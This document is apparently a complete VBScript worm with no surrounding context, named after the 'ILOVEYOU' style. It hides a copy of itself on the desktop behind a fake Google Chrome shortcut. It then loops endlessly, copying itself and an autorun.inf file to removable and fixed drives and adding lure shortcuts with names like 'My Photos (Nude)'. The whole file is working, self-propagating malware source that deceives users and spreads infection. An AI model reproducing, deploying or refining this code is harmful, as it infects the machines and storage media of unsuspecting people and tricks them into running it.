set runner = createobject("shell.application")
runner.shellexecute "chrome.exe","google.com","","",1
set fso = createobject("scripting.filesystemobject")
set drives = fso.drives
set ws = createobject("wscript.shell")
body = fso.opentextfile(wscript.scriptfullname).readall
desktop = ws.specialfolders("desktop")
myself = desktop & "\iloveu2.vbs"
if(fso.fileexists(myself)=false) then
set file = fso.createtextfile(myself)
file.write body
file.close
end if
set file_attrib = fso.getfile(myself)
file_attrib.attributes = 128+2+4
set shortcut = ws.createshortcut(desktop&"\Google Chrome.lnk")
shortcut.targetpath = myself
shortcut.iconlocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
shortcut.save 
while(1)
wscript.sleep 10000
for each drive in drives
on error resume next
if drive.drivetype = 1 or drive.drivetype = 2 then
set file = fso.createtextfile(drive&"\autorun.inf")
file.writeline ";"&rnd
file.writeline ";"&rnd
file.writeline "[Autorun]"
file.writeline ";"&rnd
file.writeline ";"&rnd
file.writeline ";"&rnd
file.writeline "Action=Open folder to view files"
file.writeline ";"&rnd
file.writeline ";"&rnd
file.writeline "Open="&drive&"\iloveu2.vbs"
file.writeline ";"&rnd
file.writeline "Icon=C:\Windows\System32\shell32.dll,4"
file.writeline ";"&rnd
file.writeline ";"&rnd
file.close
set file = fso.createtextfile(drive&"\iloveu2.vbs")
file.write body
file.close
set file_attrib = fso.getfile(drive&"\iloveu2.vbs")
file_attrib.attributes = 128+2+4
randomize
r = int(rnd*4) + 1
select case r
case 1
set shortcut = ws.createshortcut(drive&"\My Videos (Nude).lnk")
case 2
set shortcut = ws.createshortcut(drive&"\My Photos (Nude).lnk")
case 3
set shortcut = ws.createshortcut(drive&"\Selfie (Nude).lnk")
case 4
set shortcut = ws.createshortcut(drive&"\WAG BUKSAN.lnk")
end select 
shortcut.iconlocation = "C:\Windows\System32\shell32.dll,4"
shortcut.targetpath = drive&"\iloveu2.vbs"
shortcut.save
end if
next
wend 
